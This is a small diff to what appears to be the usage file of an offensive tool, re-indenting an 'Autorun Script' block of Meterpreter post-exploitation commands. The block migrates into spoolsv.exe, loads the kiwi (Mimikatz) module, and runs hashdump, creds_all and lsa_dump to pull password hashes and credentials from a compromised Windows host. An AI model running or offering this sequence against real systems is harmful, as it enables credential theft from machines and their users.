@@ -89,13 +89,14 @@ Usage(Wizard):
         ...
 ***
 Autorun Script:
-migrate -N spoolsv.exe
-load kiwi
-sysinfo
-hashdump
-creds_all
-lsa_dump
 
+    migrate -N spoolsv.exe
+    load kiwi
+    sysinfo
+    hashdump
+    creds_all
+    lsa_dump
+    
 
 ***
 To Do:
